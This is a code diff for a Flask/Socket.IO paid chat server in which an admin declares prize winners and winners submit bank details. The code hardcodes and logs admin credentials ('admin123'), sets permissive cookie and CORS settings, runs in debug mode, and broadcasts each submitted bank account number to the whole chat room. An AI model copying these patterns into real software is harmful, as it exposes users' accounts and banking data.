@@ -10,7 +10,7 @@ import os
 import re
 import time
 import logging
-from datetime import datetime
+from datetime import datetime, timedelta
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -20,6 +20,7 @@ app.config['SECRET_KEY'] = secrets.token_hex(32)
 app.config['SESSION_COOKIE_SAMESITE'] = 'None'
 app.config['SESSION_COOKIE_SECURE'] = True
 app.config['SESSION_COOKIE_HTTPONLY'] = False
+app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)
 
 CORS(app, supports_credentials=True, origins="*")
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
@@ -68,6 +69,12 @@ c.execute('''CREATE TABLE IF NOT EXISTS messages (
 c.execute('''CREATE TABLE IF NOT EXISTS settings (
     setting_key TEXT PRIMARY KEY, setting_value TEXT
 )''')
+c.execute('''CREATE TABLE IF NOT EXISTS claims (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    winner_email TEXT, winner_name TEXT,
+    account_name TEXT, account_number TEXT, bank_name TEXT,
+    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)''')
 
 c.execute("INSERT INTO users (full_name, email, password_hash, is_admin, payment_verified) VALUES (?,?,?,?,?)",
           ('Admin', 'admin@chylnx.com', hash_password('admin123'), 1, 1))
@@ -78,7 +85,10 @@ for k,v in [('game_timer_hours','24'),('info_bar_text','Welcome!'),('info_bar_co
 conn.commit()
 conn.close()
 
-# ROUTES (same as before - keeping them short)
+# ======================
+# ROUTES
+# ======================
+
 @app.route('/')
 def index(): return send_from_directory('.', 'login.html')
 
@@ -115,15 +125,11 @@ def login():
     if not user or user['password_hash'] != hash_password(pwd):
         conn.close(); return jsonify({'error':'Invalid credentials'}), 401
     conn.close()
-    
-    # ✅ Set persistent session
     session.clear()
     session['user_email'] = user['email']
     session['user_id'] = user['id']
-    session.permanent = True  # Makes session last 30 days instead of browser close
-    
-    logger.info(f"✅ Login: {email} (session permanent)")
-    
+    session.permanent = True
+    logger.info(f"✅ Login: {email}")
     return jsonify({'success':True,'user':{
         'email':user['email'],'fullName':user['full_name'],
         'paymentVerified':bool(user['payment_verified']),'isAdmin':bool(user['is_admin']),
@@ -255,11 +261,24 @@ def admin_settings():
     conn.commit(); conn.close()
     return jsonify({'success':True})
 
+@app.route('/api/admin/online-users', methods=['GET'])
+def get_online_users():
+    email = session.get('user_email')
+    if not email: return jsonify({'error':'Login'}), 401
+    conn = get_db()
+    admin = conn.execute("SELECT is_admin FROM users WHERE email=?",(email,)).fetchone()
+    if not admin or not admin['is_admin']: conn.close(); return jsonify({'error':'Admin only'}), 403
+    online_list = []
+    for user_email, data in online_users.items():
+        if user_email != email:
+            online_list.append({'email': user_email, 'name': data.get('name', 'Unknown')})
+    conn.close()
+    return jsonify({'online_users': online_list, 'count': len(online_list)})
+
 # ======================
-# ✅ FIXED SOCKET.IO
+# SOCKET.IO EVENTS
 # ======================
 
-# Track online users
 online_users = {}
 
 @socketio.on('connect')
@@ -268,7 +287,6 @@ def on_connect():
 
 @socketio.on('disconnect')
 def on_disconnect():
-    # Remove from online users
     to_remove = None
     for email, data in online_users.items():
         if data['sid'] == request.sid:
@@ -277,13 +295,12 @@ def on_disconnect():
     if to_remove:
         del online_users[to_remove]
         logger.info(f"🔴 Disconnected: {to_remove}")
-        # Update online count for everyone
-        emit('online_count', {'count': len(online_users)}, room='main_chat')
+        socketio.emit('online_count', {'count': len(online_users)}, room='main_chat')
 
 @socketio.on('join_chat')
 def on_join():
     email = session.get('user_email')
-    logger.info(f"💬 Join request: {email}, session: {dict(session)}")
+    logger.info(f"💬 Join: {email}")
     
     if not email:
         emit('error', {'message': 'Please login first'})
@@ -301,8 +318,8 @@ def on_join():
         emit('error', {'message': 'Payment required'})
         return
     
-    # Add to online users
-    online_users[email] = {'sid': request.sid, 'name': safe_get(user,'display_name') or user['full_name'].split()[0]}
+    name = safe_get(user,'display_name') or user['full_name'].split()[0]
+    online_users[email] = {'sid': request.sid, 'name': name}
     
     join_room('main_chat')
     logger.info(f"✅ {email} joined. Online: {len(online_users)}")
@@ -312,21 +329,19 @@ def on_join():
     msgs = conn.execute("SELECT * FROM messages ORDER BY rowid DESC LIMIT 50").fetchall()
     conn.close()
     
-    # ✅ Format messages properly for the client
-    formatted_msgs = []
+    formatted = []
     for m in reversed(msgs):
-        formatted_msgs.append({
+        formatted.append({
             'id': m['id'],
             'sender': m['sender_name'],
             'text': m['message_text'],
             'timestamp': m['timestamp'] if m['timestamp'] else datetime.now().isoformat(),
-            'isSystem': bool(m['is_system'])
+            'isSystem': bool(m['is_system']),
+            'senderEmail': m['sender_email'] if 'sender_email' in m.keys() else ''
         })
     
-    emit('chat_history', {'messages': formatted_msgs})
-    
-    # ✅ Send online count to everyone
-    emit('online_count', {'count': len(online_users)}, room='main_chat')
+    emit('chat_history', {'messages': formatted})
+    socketio.emit('online_count', {'count': len(online_users)}, room='main_chat')
 
 @socketio.on('send_message')
 def on_message(data):
@@ -340,169 +355,88 @@ def on_message(data):
     user = conn.execute("SELECT * FROM users WHERE email=?",(email,)).fetchone()
     if not user: conn.close(); return
     
+    if not user['payment_verified'] and not user['is_admin']:
+        conn.close(); return
+    
     name = safe_get(user,'display_name') or user['full_name'].split()[0]
     if user['is_admin']: name = f'👑 {name}'
     
-    # Insert message
     conn.execute("INSERT INTO messages (sender_name,sender_email,message_text,is_system,timestamp) VALUES (?,?,?,?,CURRENT_TIMESTAMP)",
                  (name,email,text,0))
     conn.commit()
-    
-    # Get the inserted message
     msg = conn.execute("SELECT * FROM messages WHERE rowid=last_insert_rowid()").fetchone()
     conn.close()
     
     logger.info(f"📩 {name}: {text[:30]}")
     
-    # ✅ Send properly formatted message
     emit('new_message', {
         'id': msg['id'],
         'sender': name,
         'text': text,
         'timestamp': msg['timestamp'] if msg['timestamp'] else datetime.now().isoformat(),
-        'isSystem': False
+        'isSystem': False,
+        'senderEmail': email
     }, room='main_chat')
-
-    # Add this after your other routes
-
-@app.route('/api/admin/online-users', methods=['GET'])
-def get_online_users():
-    """Get list of online users for admin"""
-    email = session.get('user_email')
-    if not email: return jsonify({'error':'Login'}), 401
-    
-    conn = get_db()
-    admin = conn.execute("SELECT is_admin FROM users WHERE email=?",(email,)).fetchone()
-    if not admin or not admin['is_admin']: 
-        conn.close()
-        return jsonify({'error':'Admin only'}), 403
-    
-    # Get online users (excluding admin)
-    online_list = []
-    for user_email, data in online_users.items():
-        if user_email != email:  # Exclude admin
-            online_list.append({
-                'email': user_email,
-                'name': data.get('name', 'Unknown')
-            })
-    
-    conn.close()
-    return jsonify({'online_users': online_list, 'count': len(online_list)})
-
-# Socket event for admin to declare winner
-@socketio.on('declare_winner')
-def on_declare_winner(data):
-    email = session.get('user_email')
-    if not email: return
-    
-    conn = get_db()
-    admin = conn.execute("SELECT is_admin FROM users WHERE email=?",(email,)).fetchone()
-    if not admin or not admin['is_admin']: 
-        conn.close()
-        return
-    
-    winner_email = safe_get(data, 'email', '')
-    winner_name = safe_get(data, 'name', 'Winner')
-    
-    conn.close()
-    
-    # Send congratulation message to everyone
-    win_msg = f'🏆🎉 CONGRATULATIONS {winner_name}! You are the WINNER! 🎉🏆'
-    
-    conn = get_db()
-    conn.execute("INSERT INTO messages (sender_name,sender_email,message_text,is_system,timestamp) VALUES (?,?,?,?,CURRENT_TIMESTAMP)",
-                 ('🏆 SYSTEM', email, win_msg, 1))
-    conn.commit()
-    conn.close()
-    
-    # Send to everyone
-    emit('winner_announced', {
-        'winner_email': winner_email,
-        'winner_name': winner_name,
-        'message': win_msg,
-        'isSystem': True
-    }, room='main_chat')
-    
-    # Also send as regular message
-    emit('new_message', {
-        'id': 0,
-        'sender': '🏆 SYSTEM',
-        'text': win_msg,
-        'timestamp': datetime.now().isoformat(),
-        'isSystem': True
-    }, room='main_chat')
-    
-    logger.info(f'🏆 Winner declared: {winner_name} ({winner_email})') 
-
-    # Add this socket event
-@socketio.on('submit_claim')
-def on_submit_claim(data):
-    email = session.get('user_email')
-    if not email: return
-    
-    account_name = safe_get(data, 'accountName', '')
-    account_number = safe_get(data, 'accountNumber', '')
-    bank_name = safe_get(data, 'bankName', '')
-    winner_name = safe_get(data, 'winnerName', '')
-    winner_email = safe_get(data, 'winnerEmail', email)
-    
-    # Save to database
-    conn = get_db()
-    conn.execute("INSERT INTO claims (winner_email, winner_name, account_name, account_number, bank_name) VALUES (?,?,?,?,?)",
-                 (winner_email, winner_name, account_name, account_number, bank_name))
-    conn.commit()
-    conn.close()
-    
-    # Send claim details to admin dashboard
-    claim_msg = f'💰 CLAIM: {winner_name} | Bank: {bank_name} | Acct: {account_number} | Name: {account_name}'
-    
-    conn = get_db()
-    conn.execute("INSERT INTO messages (sender_name,sender_email,message_text,is_system,timestamp) VALUES (?,?,?,?,CURRENT_TIMESTAMP)",
-                 ('💰 CLAIM SYSTEM', winner_email, claim_msg, 1))
-    conn.commit()
-    conn.close()
-    
-    emit('new_message', {
-        'id': 0,
-        'sender': '💰 CLAIM SYSTEM',
-        'text': claim_msg,
-        'timestamp': datetime.now().isoformat(),
-        'isSystem': True
-    }, room='main_chat')
-    
-    emit('claim_response', {'success': True})
-    logger.info(f'💰 Claim submitted by {winner_name}')
 
 @socketio.on('admin_broadcast')
 def on_broadcast(data):
     email = session.get('user_email')
     if not email: return
-    
     conn = get_db()
     user = conn.execute("SELECT * FROM users WHERE email=?",(email,)).fetchone()
     if not user or not user['is_admin']: conn.close(); return
-    
     msg_text = safe_get(data,'message','').strip()
     if not msg_text: conn.close(); return
-    
     name = safe_get(user,'display_name') or 'Admin'
-    txt = f'🔊 ANNOUNCEMENT from {name}: {msg_text}'
-    
+    txt = f'🔊 {name}: {msg_text}'
     conn.execute("INSERT INTO messages (sender_name,sender_email,message_text,is_system,timestamp) VALUES (?,?,?,?,CURRENT_TIMESTAMP)",
                  ('📢 ANNOUNCEMENT',email,txt,1))
-    conn.commit()
-    conn.close()
-    
-    emit('new_message', {
-        'id': 0,
-        'sender': '📢 ANNOUNCEMENT',
-        'text': txt,
-        'timestamp': datetime.now().isoformat(),
-        'isSystem': True
-    }, room='main_chat')
+    conn.commit(); conn.close()
+    emit('new_message', {'id':0,'sender':'📢 ANNOUNCEMENT','text':txt,'timestamp':datetime.now().isoformat(),'isSystem':True,'senderEmail':email}, room='main_chat')
+
+@socketio.on('declare_winner')
+def on_declare_winner(data):
+    email = session.get('user_email')
+    if not email: return
+    conn = get_db()
+    admin = conn.execute("SELECT is_admin FROM users WHERE email=?",(email,)).fetchone()
+    if not admin or not admin['is_admin']: conn.close(); return
+    winner_name = safe_get(data, 'name', 'Winner')
+    winner_email = safe_get(data, 'email', '')
+    win_msg = f'🏆🎉 {winner_name} is the WINNER! 🎉🏆'
+    conn.execute("INSERT INTO messages (sender_name,sender_email,message_text,is_system,timestamp) VALUES (?,?,?,?,CURRENT_TIMESTAMP)",
+                 ('🏆 SYSTEM', email, win_msg, 1))
+    conn.commit(); conn.close()
+    emit('winner_announced', {'winner_email': winner_email, 'winner_name': winner_name}, room='main_chat')
+    emit('new_message', {'id':0,'sender':'🏆 SYSTEM','text':win_msg,'timestamp':datetime.now().isoformat(),'isSystem':True,'senderEmail':email}, room='main_chat')
+    logger.info(f'🏆 Winner: {winner_name}')
+
+@socketio.on('submit_claim')
+def on_submit_claim(data):
+    email = session.get('user_email')
+    if not email: return
+    account_name = safe_get(data, 'accountName', '')
+    account_number = safe_get(data, 'accountNumber', '')
+    bank_name = safe_get(data, 'bankName', '')
+    winner_name = safe_get(data, 'winnerName', '')
+    winner_email = safe_get(data, 'winnerEmail', email)
+    conn = get_db()
+    conn.execute("INSERT INTO claims (winner_email, winner_name, account_name, account_number, bank_name) VALUES (?,?,?,?,?)",
+                 (winner_email, winner_name, account_name, account_number, bank_name))
+    conn.commit(); conn.close()
+    claim_msg = f'💰 CLAIM: {winner_name} | Bank: {bank_name} | Acct: {account_number} | Name: {account_name}'
+    conn = get_db()
+    conn.execute("INSERT INTO messages (sender_name,sender_email,message_text,is_system,timestamp) VALUES (?,?,?,?,CURRENT_TIMESTAMP)",
+                 ('💰 CLAIM SYSTEM', winner_email, claim_msg, 1))
+    conn.commit(); conn.close()
+    emit('new_message', {'id':0,'sender':'💰 CLAIM SYSTEM','text':claim_msg,'timestamp':datetime.now().isoformat(),'isSystem':True,'senderEmail':winner_email}, room='main_chat')
+    emit('claim_response', {'success': True})
+    logger.info(f'💰 Claim: {winner_name}')
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 10000))
+    logger.info("=" * 50)
     logger.info("🚀 Server starting on port " + str(port))
     logger.info("👑 Admin: admin@chylnx.com / admin123")
+    logger.info("=" * 50)
     socketio.run(app, host='0.0.0.0', port=port, debug=True)
